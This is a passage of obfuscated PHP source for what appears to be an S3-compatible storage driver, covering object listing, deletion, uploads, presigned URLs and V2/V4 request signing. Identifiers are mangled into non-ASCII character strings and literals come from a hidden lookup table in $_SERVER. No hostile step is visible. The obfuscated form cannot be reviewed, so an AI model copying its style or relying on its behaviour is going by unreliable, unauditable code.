(!$this->exist($‚§ÑÚÖ·)) { return !0; } $this->listItemCache = !1; $Ş®‘À÷ = $this->fileList($‚§ÑÚÖ·); $this->listItemCache = !0; $ÌíÛ“µ˜ = trim($‚§ÑÚÖ·, $Æù˜£Á[8]) . $Æù˜£Á[8]; if (!empty($‚§ÑÚÖ·) && $‚§ÑÚÖ· !== $Æù˜£Á[241] && !in_array($ÌíÛ“µ˜, $Ş®‘À÷[$Æù˜£Á[95]])) { $Ş®‘À÷[$Æù˜£Á[95]][] = $ÌíÛ“µ˜; } $ä¢ Ï’á = $this->delByBatch($Ş®‘À÷[$Æù˜£Á[96]]); if (!$ä¢ Ï’á) { return !1; } $ä¢ Ï’á = $this->delByBatch($Ş®‘À÷[$Æù˜£Á[95]]); if (!$ä¢ Ï’á) { return !1; } return $this->delFile($ÌíÛ“µ˜); } private function delByBatch($—ÒÀóƒ) { foreach (array_chunk($—ÒÀóƒ, 1000) as $ÃŞëËš²) { $ô„Ğ§¹‰ = $this->client->deleteObjects($this->bucket, $ÃŞëËš²); if (!$ô„Ğ§¹‰) { return !1; } } return !0; } public function rename($ş†‚éÅÖ, $üú–£ÛÉ) { return $this->renameObject($ş†‚éÅÖ, $üú–£ÛÉ); } public function listPath($Ù˜ÍîËÊ, $åÑäÀô° = false) { $Êò“„òÇ =& $_SERVER[¬ÏÕ§Áú]; $½—åÇ¢ = $this->fileList($Ù˜ÍîËÊ, $Êò“„òÇ[8], !0); foreach ($½—åÇ¢[$Êò“„òÇ[95]] as $’ìûĞ¥Œ => $ŒÍşãş) { $½—åÇ¢[$Êò“„òÇ[95]][$’ìûĞ¥Œ] = $this->folderInfo($ŒÍşãş, $åÑäÀô°, $ŒÍşãş); } foreach ($½—åÇ¢[$Êò“„òÇ[96]] as $’ìûĞ¥Œ => $ŒÍşãş) { $½—åÇ¢[$Êò“„òÇ[96]][$’ìûĞ¥Œ] = $this->fileInfo($ŒÍşãş[$Êò“„òÇ[32]], $åÑäÀô°, $ŒÍşãş); } return $½—åÇ¢; } protected function infoChildren($åè±…Û, &$Õ©ÃŞ“) { $ìôñ«Õ¿ =& $_SERVER[¬ÏÕ§Áú]; $Ø„µÀ¹‡ = $this->fileList($åè±…Û, $ìôñ«Õ¿[12], !0); $Õ©ÃŞ“[$ìôñ«Õ¿[91]] += count($Ø„µÀ¹‡[$ìôñ«Õ¿[95]]); $Õ©ÃŞ“[$ìôñ«Õ¿[90]] += count($Ø„µÀ¹‡[$ìôñ«Õ¿[96]]); foreach ($Ø„µÀ¹‡[$ìôñ«Õ¿[96]] as $Ê¬Ø§®) { if (!$Ê¬Ø§® || !$Ê¬Ø§®[$ìôñ«Õ¿[89]]) { continue; } $Õ©ÃŞ“[$ìôñ«Õ¿[89]] += $Ê¬Ø§®[$ìôñ«Õ¿[89]]; } } private function fileInfo($Ôûô¨üÔ, $í¨ïÕ• = false, $¡öÖ¼ù½ = array()) { $éç°Ä¯ =& $_SERVER[¬ÏÕ§Áú]; $ÀåÌˆ´í = array($éç°Ä¯[32] => $this->pathThis($Ôûô¨üÔ), $éç°Ä¯[97] => $this->getPathOuter($Ôûô¨üÔ), $éç°Ä¯[33] => $éç°Ä¯[243], $éç°Ä¯[179] => $this->ext($Ôûô¨üÔ), $éç°Ä¯[89] => isset($¡öÖ¼ù½[$éç°Ä¯[89]]) ? $¡öÖ¼ù½[$éç°Ä¯[89]] : 0); if ($í¨ïÕ•) { return $ÀåÌˆ´í; } $ÀåÌˆ´í[$éç°Ä¯[244]] = $ÀåÌˆ´í[$éç°Ä¯[98]] = 0; $ÀåÌˆ´í[$éç°Ä¯[245]] = $ÀåÌˆ´í[$éç°Ä¯[246]] = !0; if (empty($¡öÖ¼ù½)) { $¡öÖ¼ù½ = $this->objectMeta($Ôûô¨üÔ); if (!$¡öÖ¼ù½) { return $ÀåÌˆ´í; } } if (isset($¡öÖ¼ù½[$éç°Ä¯[247]]) && $¡öÖ¼ù½[$éç°Ä¯[247]]) { $ÀåÌˆ´í[$éç°Ä¯[248]] = $¡öÖ¼ù½[$éç°Ä¯[247]]; } if (isset($¡öÖ¼ù½[$éç°Ä¯[217]])) { $ÀåÌˆ´í[$éç°Ä¯[98]] = $¡öÖ¼ù½[$éç°Ä¯[217]]; } if (isset($¡öÖ¼ù½[$éç°Ä¯[89]])) { $ÀåÌˆ´í[$éç°Ä¯[89]] = $¡öÖ¼ù½[$éç°Ä¯[89]]; } return $ÀåÌˆ´í; } private function folderInfo($äß˜æù×, $¢â§ü¸Æ = false, $ş°Ò«”µ = array()) { $æÄÚ§ÎÖ =& $_SERVER[¬ÏÕ§Áú]; $³á±ĞÇÁ = array($æÄÚ§ÎÖ[32] => $this->pathThis($äß˜æù×), $æÄÚ§ÎÖ[97] => $this->getPathOuter($æÄÚ§ÎÖ[8] . $äß˜æù×), $æÄÚ§ÎÖ[33] => $æÄÚ§ÎÖ[88]); if ($¢â§ü¸Æ) { return $³á±ĞÇÁ; } $³á±ĞÇÁ[$æÄÚ§ÎÖ[244]] = $³á±ĞÇÁ[$æÄÚ§ÎÖ[98]] = 0; $³á±ĞÇÁ[$æÄÚ§ÎÖ[245]] = $³á±ĞÇÁ[$æÄÚ§ÎÖ[246]] = !0; if ($äß˜æù× == $æÄÚ§ÎÖ[12]) { return $³á±ĞÇÁ; } if (empty($ş°Ò«”µ)) { $ş°Ò«”µ = $this->objectMeta(trim($äß˜æù×, $æÄÚ§ÎÖ[8]) . $æÄÚ§ÎÖ[8]); } if (isset($ş°Ò«”µ[$æÄÚ§ÎÖ[217]])) { $³á±ĞÇÁ[$æÄÚ§ÎÖ[244]] = $ş°Ò«”µ[$æÄÚ§ÎÖ[217]]; } return $³á±ĞÇÁ; } private function fileList($šÏ“­Ü‚, $‹ùÒĞõ = '', $¾²®˜ó¥ = 0) { $¬¥åºä× =& $_SERVER[¬ÏÕ§Áú]; $©‹»ß¢³ = rtrim($šÏ“­Ü‚, $¬¥åºä×[8]) . $¬¥åºä×[8]; $•€âìÅŒ = $this->listObjs($©‹»ß¢³, null, null, $‹ùÒĞõ); if (!$•€âìÅŒ) { return array($¬¥åºä×[95] => array(), $¬¥åºä×[96] => array()); } $î„ƒ£× = $ö˜äõÁı = array(); foreach ($•€âìÅŒ[$¬¥åºä×[249]] as $£Ìµ²”) { $¹„Û×ìñ = $£Ìµ²”[$¬¥åºä×[32]]; if ($¹„Û×ìñ == $©‹»ß¢³) { continue; } $×¯íŒ®À = isset($£Ìµ²”[$¬¥åºä×[89]]) ? $£Ìµ²”[$¬¥åºä×[89]] : 0; $¼«Ü«‚ = $×¯íŒ®À == 0 && substr($¹„Û×ìñ, strlen($¹„Û×ìñ) - 1, 1) == $¬¥åºä×[8] ? !0 : !1; $this->cacheMethodInfoSet($¹„Û×ìñ, $¼«Ü«‚, $£Ìµ²”); if ($¼«Ü«‚) { $î„ƒ£×[] = $¹„Û×ìñ; continue; } $ö˜äõÁı[] = $¾²®˜ó¥ ? $£Ìµ²” : $¹„Û×ìñ; } foreach ($•€âìÅŒ[$¬¥åºä×[250]] as $£Ìµ²”) { $î„ƒ£×[] = $£Ìµ²”[$¬¥åºä×[32]]; $this->cacheMethodInfoSet($£Ìµ²”[$¬¥åºä×[32]], !0); } $this->cacheMethodInfoSet($šÏ“­Ü‚, !0); return array($¬¥åºä×[95] => $î„ƒ£×, $¬¥åºä×[96] => $ö˜äõÁı); } private function listObjs($¿¹×Ù€æ, $·¹å»”è = null, $Ø»Úœùú = null, $ñş’¶½¹ = null) { $œÖº¢ĞÛ =& $_SERVER[¬ÏÕ§Áú]; $¿¹×Ù€æ = trim($¿¹×Ù€æ, $œÖº¢ĞÛ[8]); $÷Ø•åäô = empty($¿¹×Ù€æ) && $¿¹×Ù€æ !== $œÖº¢ĞÛ[241] ? $œÖº¢ĞÛ[12] : $¿¹×Ù€æ . $œÖº¢ĞÛ[8]; return $this->client->getBucket($this->bucket, $÷Ø•åäô, $·¹å»”è, $Ø»Úœùú, $ñş’¶½¹, !0); } public function has($Ïä¡÷Ù, $¿ÂõÂŞ— = false, $£Àºà´¥ = true) { $–˜ò¡¹® =& $_SERVER[¬ÏÕ§Áú]; $Ïä¡÷Ù = trim($Ïä¡÷Ù, $–˜ò¡¹®[8]); $Ó·Ï€Ö = empty($Ïä¡÷Ù) && $Ïä¡÷Ù !== $–˜ò¡¹®[241] ? $–˜ò¡¹®[12] : $Ïä¡÷Ù . $–˜ò¡¹®[8]; $çí®•Ä¼ = null; $ÉíÔéÛ = 500; $š“¢·íË = $–˜ò¡¹®[8]; $¡úÓƒĞ° = $Äå½Ä ê = array(); while (!0) { $‘ÑÓŒË… = $this->listObjs($Ïä¡÷Ù, $çí®•Ä¼, $ÉíÔéÛ, $š“¢·íË); if (!$‘ÑÓŒË…) { break; } $çí®•Ä¼ = $‘ÑÓŒË…[$–˜ò¡¹®[251]]; $¤¬¸¢•Ú = $‘ÑÓŒË…[$–˜ò¡¹®[249]]; $¹İ¡ïÀÖ = $‘ÑÓŒË…[$–˜ò¡¹®[250]]; if (empty($¤¬¸¢•Ú) && empty($¹İ¡ïÀÖ)) { break; } if (count($¤¬¸¢•Ú) == 1 && $¤¬¸¢•Ú[0][$–˜ò¡¹®[32]] == $Ó·Ï€Ö) { break; } if ($¿ÂõÂŞ—) { if (count($¤¬¸¢•Ú)) { $¤¬¸¢•Ú = array_column($¤¬¸¢•Ú, $–˜ò¡¹®[32]); $¡úÓƒĞ° = array_merge($¡úÓƒĞ°, $¤¬¸¢•Ú); } if (count($¹İ¡ïÀÖ)) { $¹İ¡ïÀÖ = array_column($¹İ¡ïÀÖ, $–˜ò¡¹®[32]); $Äå½Ä ê = array_merge($Äå½Ä ê, $¹İ¡ïÀÖ); } if ($çí®•Ä¼ === null) { break; } continue; } if ($£Àºà´¥) { if (!empty($¤¬¸¢•Ú)) { if (count($¤¬¸¢•Ú) > 1 || isset($¤¬¸¢•Ú[0][$–˜ò¡¹®[32]]) && $¤¬¸¢•Ú[0][$–˜ò¡¹®[32]] != $Ó·Ï€Ö) { return !0; } } } else { if (!empty($¹İ¡ïÀÖ)) { return !0; } } if ($çí®•Ä¼ === null) { break; } } if ($¿ÂõÂŞ—) { $¡úÓƒĞ° = array_diff($¡úÓƒĞ°, array($Ó·Ï€Ö)); $¡úÓƒĞ° = count(array_unique($¡úÓƒĞ°)); $Äå½Ä ê = count(array_unique($Äå½Ä ê)); return array($–˜ò¡¹®[252] => $¡úÓƒĞ°, $–˜ò¡¹®[253] => $Äå½Ä ê); } return !1; } public function listAll($åÉ—×‰Î) { $ŞÚÓÃ‚– =& $_SERVER[¬ÏÕ§Áú]; $× Ÿë‰ = $this->fileList($åÉ—×‰Î, $ŞÚÓÃ‚–[12], !0); $à±ñ„Ç² = array_to_keyvalue($× Ÿë‰[$ŞÚÓÃ‚–[96]], $ŞÚÓÃ‚–[32]); foreach ($× Ÿë‰[$ŞÚÓÃ‚–[95]] as $ãà¾åİ²) { if (is_string($ãà¾åİ²)) { $à±ñ„Ç²[$ãà¾åİ²] = array($ŞÚÓÃ‚–[89] => 0); } } return $this->listAllFiles($åÉ—×‰Î, $à±ñ„Ç²); } public function canRead($êòÔ¬Ù ) { $ó½º¡µŞ =& $_SERVER[¬ÏÕ§Áú]; $¶ü›¤Ü¬ = $this->client->getAccessControlPolicy($this->bucket, $êòÔ¬Ù ); if (!$¶ü›¤Ü¬) { return !1; } return in_array($¶ü›¤Ü¬, array($ó½º¡µŞ[254], $ó½º¡µŞ[255], $ó½º¡µŞ[256])) ? !0 : !1; } public function canWrite($öÙ¯å¸) { $‚ô¬ÒáÂ =& $_SERVER[¬ÏÕ§Áú]; $¦‹ıˆ« = $this->client->getAccessControlPolicy($this->bucket, $öÙ¯å¸); if (!$¦‹ıˆ«) { return !1; } return in_array($¦‹ıˆ«, array($‚ô¬ÒáÂ[254], $‚ô¬ÒáÂ[255])) ? !0 : !1; } public function getContent($š‰¡Ÿ¾Û) { return $this->client->getObject($this->bucket, $š‰¡Ÿ¾Û); } public function setContent($©½è…ü, $€îŒï—¸ = '', $ëÓó®Âõ = false) { $º•ÀèË¢ =& $_SERVER[¬ÏÕ§Áú]; $©½è…ü = $ëÓó®Âõ ? trim($©½è…ü, $º•ÀèË¢[8]) . $º•ÀèË¢[8] : $©½è…ü; $é¦”æº¿ = get_file_mime(get_path_ext($©½è…ü)); $îÊ×óµ÷ = $this->client->putObject($€îŒï—¸, $this->bucket, $©½è…ü, $º•ÀèË¢[242], array(), $é¦”æº¿); if (!$îÊ×óµ÷) { return !1; } if ($ëÓó®Âõ) { return !0; } return $îÊ×óµ÷ ? !0 : !1; } public function fileSubstr($ÖÎ²şºÓ, $¦Ú¥¼œÖ, $êª”Ô©¬) { $ĞŸÖÜ– = $¦Ú¥¼œÖ + $êª”Ô©¬ - 1; return $this->client->getObject($this->bucket, $ÖÎ²şºÓ, array($_SERVER[¬ÏÕ§Áú][257] => "\x62\x79\x74\145\x73\75{$¦Ú¥¼œÖ}\55{$ĞŸÖÜ–}")); } public function upload($¾Â¡Úê•, $Ò»îÜ€À, $ÚÀ¼Ï€— = false, $µŞßñĞÊ = REPEAT_REPLACE) { $±ã”ÃÖĞ =& $_SERVER[¬ÏÕ§Áú]; $ÔÖ öâõ = array($±ã”ÃÖĞ[258] => @md5_file($Ò»îÜ€À)); $¡¯Í˜–ö = array($±ã”ÃÖĞ[259] => get_file_mime(get_path_ext($¾Â¡Úê•))); if (IO::size($Ò»îÜ€À) <= 1024 * 1024 * 200) { $¡»²ÒšÊ = $this->client->putObjectFile($Ò»îÜ€À, $this->bucket, $¾Â¡Úê•, $±ã”ÃÖĞ[242], $ÔÖ öâõ, $¡¯Í˜–ö); return !empty($¡»²ÒšÊ) ? $this->getPathOuter($¾Â¡Úê•) : !1; } $ÌÃ•†˜ = $this->client->multiUploadObject($Ò»îÜ€À, $this->bucket, trim($¾Â¡Úê•, $±ã”ÃÖĞ[8]), $ÔÖ öâõ, $¡¯Í˜–ö); return $ÌÃ•†˜ ? $this->getPathOuter($¾Â¡Úê•) : !1; } public function download($ĞÓçÖ«Á, $Ã­¾‰Ôå) { if (!@is_dir($this->pathFather($Ã­¾‰Ôå)) && !IO::mkdir($this->pathFather($Ã­¾‰Ôå))) { return !1; } $µ¸»…Ş„ = $this->client->getObject($this->bucket, $ĞÓçÖ«Á, array(), $Ã­¾‰Ôå); return $µ¸»…Ş„ !== !1 ? $Ã­¾‰Ôå : !1; } public function link($İãÔ‰Ï², $ÖË¾Ïˆ = array()) { return $this->getPreSignedURL($İãÔ‰Ï², 3600 * 12, $ÖË¾Ïˆ); } private function getPreSignedURL($¸·•†»ú, $Å¾åÖÄÌ, $Ì£‰²Ÿå = array(), $ª¹ÂÔ‰ = "\x47\105\124") { $œ¨åæ Ş =& $_SERVER[¬ÏÕ§Áú]; $¸·•†»ú = trim($¸·•†»ú, $œ¨åæ Ş[8]); if ($this->signVer == $œ¨åæ Ş[260]) { return $this->client->getPreSignedV2URL($this->bucket, $¸·•†»ú, $Å¾åÖÄÌ, $ª¹ÂÔ‰, $Ì£‰²Ÿå); } return $this->client->getPreSignedV4URL($this->bucket, $¸·•†»ú, $Å¾åÖÄÌ, array(), $ª¹ÂÔ‰, $Ì£‰²Ÿå); } public function fileOut($Á¿ÎÒ¶ù, $¥†ÛâÒû = false, $·½² –Ã = false, $õ›‚—Êš = '') { $¸¬±¢¡æ =& $_SERVER[¬ÏÕ§Áú]; if ($this->isFileOutServer()) { return $this->fileOutServer($Á¿ÎÒ¶ù, $¥†ÛâÒû, $·½² –Ã, $õ›‚—Êš); } if (!$·½² –Ã) { $·½² –Ã = $this->pathThis($Á¿ÎÒ¶ù); } $·ëºüÅÍ = get_file_mime(get_path_ext($·½² –Ã)); if ($·ëºüÅÍ == $¸¬±¢¡æ[261]) { return parent::fileOut($Á¿ÎÒ¶ù, $¥†ÛâÒû, $·½² –Ã, $õ›‚—Êš); } $œ«ËëŒŠ = array($¸¬±¢¡æ[262] => $·ëºüÅÍ); if ($¥†ÛâÒû) { $œ«ËëŒŠ[$¸¬±¢¡æ[263]] = $¸¬±¢¡æ[264] . rawurlencode($·½² –Ã); } else { } $¶ûÈÌáİ = $this->link($Á¿ÎÒ¶ù, $œ«ËëŒŠ); $this->fileOutLink($¶ûÈÌáİ); } public function fileOutServer($àû‰¨ú´, $øíÀÈ€’ = false, $Ÿáğ¼Ëö = false, $±õ«á–± = '') { parent::fileOut($àû‰¨ú´, $øíÀÈ€’, $Ÿáğ¼Ëö, $±õ«á–±); } public function fileOutImageServer($ê¥·ÔÇ‰, $ş«³ñı“ = 250) { parent::fileOutImage($ê¥·ÔÇ‰, $ş«³ñı“); } public function fileOutLink($Ã¤Ûõ¦) { $…íŞÒâ =& $_SERVER[¬ÏÕ§Áú]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($…íŞÒâ[77], $…íŞÒâ[76], $…íŞÒâ[78])) && !get_url_scheme($this->endpoint) && substr($Ã¤Ûõ¦, 0, 7) == $…íŞÒâ[229]) { $Ã¤Ûõ¦ = $…íŞÒâ[230] . substr($Ã¤Ûõ¦, 7); } header($…íŞÒâ[185] . $Ã¤Ûõ¦); die; } public function hashMd5($‘‡àíıò, $¸ı¹­Àˆ = '') { $ì¥§¦®µ = $this->objectMeta($‘‡àíıò); if (!$ì¥§¦®µ) { return !1; } $¸ı¹­Àˆ = $¸ı¹­Àˆ ? $¸ı¹­Àˆ : _get($ì¥§¦®µ, $_SERVER[¬ÏÕ§Áú][265]); return $¸ı¹­Àˆ; } public function uploadFormData($á»Ì½™, $âä«ü ¨ = 3600) { $µ•ò¯¼ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->_isClientAsync()) { $¡¢¼ç = $this->getPreSignedURL($á»Ì½™, $âä«ü ¨, array(), $µ•ò¯¼[266]); return array($µ•ò¯¼[219] => str_replace($µ•ò¯¼[229], $µ•ò¯¼[267], $¡¢¼ç)); } if (isset($GLOBALS[$µ•ò¯¼[6]][$µ•ò¯¼[102]][$µ•ò¯¼[268]]) && $GLOBALS[$µ•ò¯¼[6]][$µ•ò¯¼[102]][$µ•ò¯¼[268]] == $µ•ò¯¼[241]) { return $this->uploadMultiData($á»Ì½™, $âä«ü ¨); } if ($this->signVer == $µ•ò¯¼[260]) { return $this->uploadFormDataV2($á»Ì½™, $âä«ü ¨); } return $this->uploadFormDataV4($á»Ì½™, $âä«ü ¨); } public function uploadFormDataV2($£äÂ¥§°, $«®×¦éï = 3600) { $Ö’ëÙ‹ =& $_SERVER[¬ÏÕ§Áú]; $Ò¿ş®ã› = $this->pathFather($£äÂ¥§°); $Ö€Œ£Èš = $this->client->getHttpUploadPostParams($this->bucket, $Ò¿ş®ã›, $Ö’ëÙ‹[242], $«®×¦éï); $–úŸŒş = array_merge((array) $Ö€Œ£Èš, array($Ö’ëÙ‹[269] => $Ö’ëÙ‹[260], $Ö’ëÙ‹[219] => $this->getHost())); if ($this->_isClientAsync()) { unset($–úŸŒş[$Ö’ëÙ‹[269]]); } return $–úŸŒş; } public function uploadFormDataV4($°‘ÔõÀ·, $¶¾Úù‚ = 3600) { $ûõ€úÑ =& $_SERVER[¬ÏÕ§Áú]; $Å–§Š¢È = $ûõ€úÑ[242]; $»ÖõÆİ = $ûõ€úÑ[270]; $¥œÁ™ = $ûõ€úÑ[72]; $óßñÁÜ = gmdate($ûõ€úÑ[271]); $ ·Ô©ƒÙ = gmdate($ûõ€úÑ[272]); $Ş«·Í© = $ûõ€úÑ[273]; $Ò÷©Ä¯‘ = $¶¾Úù‚ . $ûõ€úÑ[12]; $éúÓÇ³ = $ûõ€úÑ[274]; $›’âÅ«õ = array($this->accessKey, $ ·Ô©ƒÙ, $this->region, $¥œÁ™, $Ş«·Í©); $³’ÖÛÙ = implode($ûõ€úÑ[8], $›’âÅ«õ); $¥‡º÷ÉÚ = array($ûõ€úÑ[275] => gmdate($ûõ€úÑ[276], strtotime($ûõ€úÑ[277])), $ûõ€úÑ[278] => array(array($ûõ€úÑ[279] => $this->bucket), array($ûõ€úÑ[280], $ûõ€úÑ[281], $ûõ€úÑ[12]), array($ûõ€úÑ[280], $ûõ€úÑ[282], $ûõ€úÑ[12]), array($ûõ€úÑ[283] => $éúÓÇ³), array($ûõ€úÑ[284] => $³’ÖÛÙ), array($ûõ€úÑ[285] => $»ÖõÆİ), array($ûõ€úÑ[286] => $óßñÁÜ), array($ûõ€úÑ[287] => $Ò÷©Ä¯‘))); $œÚ¦ï­ë = base64_encode(json_encode($¥‡º÷ÉÚ)); $É‹Û”´ò = hash_hmac($ûõ€úÑ[288], $ ·Ô©ƒÙ, $ûõ€úÑ[289] . $this->secret, !0); $¡Ç¬Üö– = hash_hmac($ûõ€úÑ[288], $this->region, $É‹Û”´ò, !0); $˜£ ·È = hash_hmac($ûõ€úÑ[288], $¥œÁ™, $¡Ç¬Üö–, !0); $¼“ÇÈöé = hash_hmac($ûõ€úÑ[288], $Ş«·Í©, $˜£ ·È, !0); $¼“¹‘² = hash_hmac($ûõ€úÑ[288], $œÚ¦ï­ë, $¼“ÇÈöé); $ËïêüÄ = array($ûõ€úÑ[259] => $ûõ€úÑ[12], $ûõ€úÑ[283] => $éúÓÇ³, $ûõ€úÑ[290] => $œÚ¦ï­ë, $ûõ€úÑ[284] => $³’ÖÛÙ, $ûõ€úÑ[285] => $»ÖõÆİ, $ûõ€úÑ[286] => $óßñÁÜ, $ûõ€úÑ[287] => $Ò÷©Ä¯‘, $ûõ€úÑ[291] => $¼“¹‘², $ûõ€úÑ[269] => $ûõ€úÑ[260], $ûõ€úÑ[219] => $this->getHost()); if ($this->_isClientAsync()) { unset($ËïêüÄ[$ûõ€úÑ[269]]); } return $ËïêüÄ; } public function uploadMultiData($‹ùÇëºœ, $¾õàĞ » = 3600) { $™î­«£Ş =& $_SERVER[¬ÏÕ§Áú]; $Å…®Øä³ = $this->signVer == $™î­«£Ş[260] ? gmdate($™î­«£Ş[292]) : gmdate($™î­«£Ş[293]); $¯İğĞ‹ = array(); $ªÎ™¹Šû = $this->client->getUploadId($this->bucket, $‹ùÇëºœ, $¯İğĞ‹); if (!$ªÎ™¹Šû) { return !1; } $İ•‰à¦ù = array($™î­«£Ş[294] => $ªÎ™¹Šû, $™î­«£Ş[219] => $this->getHost() . $™î­«£Ş[8] . $this->pathEncode($‹ùÇëºœ), $™î­«£Ş[295] => $Å…®Øä³, $™î­«£Ş[107] => $‹ùÇëºœ, $™î­«£Ş[269] => $this->signVer); if ($this->_isClientAsync()) { unset($İ•‰à¦ù[$™î­«£Ş[269]]); } return $İ•‰à¦ù; } public function uploadMultiAuth($ˆä£˜‚°, $ÙßõÆá¾ = array()) { $¶şæùâë =& $_SERVER[¬ÏÕ§Áú]; if ($this->signVer == $¶şæùâë[260]) { if (isset($ÙßõÆá¾[$¶şæùâë[296]])) { return $this->uploadPartAuthV2($ˆä£˜‚°, $ÙßõÆá¾); } return $this->uploadListAuthV2($ˆä£˜‚°, $ÙßõÆá¾); } if (isset($ÙßõÆá¾[$¶şæùâë[296]])) { return $this->uploadPartAuthV4($ˆä£˜‚°, $ÙßõÆá¾); } return $this->uploadListAuthV4($ˆä£˜‚°, $ÙßõÆá¾); } public function uploadPartAuthV2($üáÃ“ş, $ÕáƒÅ’ô = array()) { $˜¸±ß’Æ =& $_SERVER[¬ÏÕ§Áú]; $±¿¼Üèí = $ÕáƒÅ’ô[$˜¸±ß’Æ[107]]; $ú²µ—Ñ§ = gmdate($˜¸±ß’Æ[292]); $–¢äÊ§ñ = array_intersect_key($ÕáƒÅ’ô, array_flip(array($˜¸±ß’Æ[296], $˜¸±ß’Æ[294]))); ksort($–¢äÊ§ñ); $Œ¬ºí¯¹ = $–¢äÊ§ñ ? $˜¸±ß’Æ[86] . http_build_query($–¢äÊ§ñ, null, $˜¸±ß’Æ[297], PHP_QUERY_RFC3986) : $˜¸±ß’Æ[12]; $‘İ›Ğ÷ = array($˜¸±ß’Æ[266], $˜¸±ß’Æ[12], $˜¸±ß’Æ[133], $˜¸±ß’Æ[12], "\x78\x2d\x61\x6d\x7a\55\144\x61\164\145\x3a{$ú²µ—Ñ§}", $˜¸±ß’Æ[8] . $this->bucket . $˜¸±ß’Æ[8] . $this->pathEncode($±¿¼Üèí) . $Œ¬ºí¯¹); $Ïâş Ö = implode($˜¸±ß’Æ[65], $‘İ›Ğ÷); $èÑë ­º = $this->client->__getSignature($Ïâş Ö); return array($˜¸±ß’Æ[298] => $èÑë ­º, $˜¸±ß’Æ[295] => $ú²µ—Ñ§); } public function uploadListAuthV2($Íï©Á¬, $¥œ™¦İÀ = array()) { $Ü ¸áŒ’ =& $_SERVER[¬ÏÕ§Áú]; $Å§¹æÍ = $¥œ™¦İÀ[$Ü ¸áŒ’[107]]; $ÒÍØÆ€Æ = $¥œ™¦İÀ[$Ü ¸áŒ’[294]]; $ëº–ê± = $this->client->listParts($this->bucket, $Å§¹æÍ, $ÒÍØÆ€Æ); if (!$ëº–ê±) { return !1; } $ºŒìÆ¬† = gmdate($Ü ¸áŒ’[292]); $–İóš¡ = $Ü ¸áŒ’[299] . $ÒÍØÆ€Æ; $¤ŸŠæ¬ = array($Ü ¸áŒ’[300], $Ü ¸áŒ’[12], $Ü ¸áŒ’[133], $Ü ¸áŒ’[12], "\170\x2d\x61\155\x7a\x2d\144\141\x74\x65\x3a{$ºŒìÆ¬†}", $Ü ¸áŒ’[8] . $this->bucket . $Ü ¸áŒ’[8] . $this->pathEncode($Å§¹æÍ) . $–İóš¡); $Ó¼‘ÖòÚ = implode($Ü ¸áŒ’[65], $¤ŸŠæ¬); $ÅÇ˜£­Í = $this->client->__getSignature($Ó¼‘ÖòÚ); return array($Ü ¸áŒ’[298] => $ÅÇ˜£­Í, $Ü ¸áŒ’[295] => $ºŒìÆ¬†, $Ü ¸áŒ’[301] => $ëº–ê±); } public function uploadPartAuthV4($´µŞ¡ö´, $ø»Ï¸ˆ = array()) { $Œİ¦«½® =& $_SERVER[¬ÏÕ§Áú]; $€‚í ˜ = $ø»Ï¸ˆ[$Œİ¦«½®[107]]; $¾”Ğ¦»× = array($Œİ¦«½®[286] => gmdate($Œİ¦«½®[293]), $Œİ¦«½®[302] => _get($ø»Ï¸ˆ, $Œİ¦«½®[303], hash($Œİ¦«½®[288], $Œİ¦«½®[12]))); $«ƒçŸäğ = explode($Œİ¦«½®[221], $this->getHost()); $á—ëİş» = array($Œİ¦«½®[304] => $«ƒçŸäğ[1], $Œİ¦«½®[305] => $Œİ¦«½®[12], $Œİ¦«½®[259] => $Œİ¦«½®[133], $Œİ¦«½®[306] => $ø»Ï¸ˆ[$Œİ¦«½®[89]]); $É´¡ÄïÄ = $Œİ¦«½®[266]; $–ŸèĞÙ­ = $Œİ¦«½®[8] . $this->pathEncode($€‚í ˜); $ £Ñ–â = array_intersect_key($ø»Ï¸ˆ, array_flip(array($Œİ¦«½®[296], $Œİ¦«½®[294]))); $ÑóñÅ¨Ê = $this->client->__getSignatureV4($¾”Ğ¦»×, $á—ëİş», $É´¡ÄïÄ, $–ŸèĞÙ­, $ £Ñ–â); return array($Œİ¦«½®[298] => $ÑóñÅ¨Ê, $Œİ¦«½®[302] => $¾”Ğ¦»×[$Œİ¦«½®[302]], $Œİ¦«½®[295] => $¾”Ğ¦»×[$Œİ¦«½®[286]]); } public function uploadListAuthV4($”Å±Àˆ, $›ÙÍ¹‘× = array()) { $›¬şÁ‡ =& $_SERVER[¬ÏÕ§Áú]; $¬‚ı–³ = $›ÙÍ¹‘×[$›¬şÁ‡[107]]; $‘¸¥»ö = $›ÙÍ¹‘×[$›¬şÁ‡[294]]; $áĞú²•– = $this->client->listParts($this->bucket, $¬‚ı–³, $‘¸¥»ö); if (!$áĞú²•–) { return !1; } $€ª¶ì‘Œ = $›¬şÁ‡[307]; foreach ($áĞú²•– as $Ãù˜ÄşÕ) { $€ª¶ì‘Œ .= $›¬şÁ‡[308] . "\x3c\120\141\x72\x74\x4e\165\155\x62\x65\x72\76{$Ãù˜ÄşÕ[$›¬şÁ‡[309]]}\x3c\57\120\141\x72\x74\116\165\155\142\x65\162\76\xa" . "\74\x45\x54\x61\x67\76{$Ãù˜ÄşÕ[$›¬şÁ‡[310]]}\74\57\105\x54\141\x67\x3e\12" . $›¬şÁ‡[311]; } $€ª¶ì‘Œ .= $›¬şÁ‡[312]; $±¢·Í±« = array($›¬şÁ‡[286] => gmdate($›¬şÁ‡[293]), $›¬şÁ‡[302] => hash($›¬şÁ‡[288], $€ª¶ì‘Œ)); $¹¡ß…âè = explode($›¬şÁ‡[221], $this->getHost()); $…Ûíèñ = array($›¬şÁ‡[304] => $¹¡ß…âè[1], $›¬şÁ‡[259] => $›¬şÁ‡[133], $›¬şÁ‡[306] => strlen($€ª¶ì‘Œ)); $¹²ÌÕ†Œ = $›¬şÁ‡[300]; $ú—ÕÊ‘ = $›¬şÁ‡[8] . $this->pathEncode($¬‚ı–³); $ç¾š‘”÷ = array($›¬şÁ‡[294] => $‘¸¥»ö); $‹ˆùİ§ = $this->client->__getSignatureV4($±¢·Í±«, $…Ûíèñ, $¹²ÌÕ†Œ, $ú—ÕÊ‘, $ç¾š‘”÷); return array($›¬şÁ‡[298] => $‹ˆùİ§, $›¬şÁ‡[302] => $±¢·Í±«[$›¬şÁ‡[302]], $›¬şÁ‡[295] => $±¢·Í±«[$›¬şÁ‡[286]], $›¬şÁ‡[301] => $áĞú²•–); } private function _isClientAsync() { $˜›•÷Ùˆ =& $_SERVER[¬ÏÕ§Áú]; static $ûë‘Şùñ = null; if ($ûë‘Şùñ === null) { $éÀ×—“š = 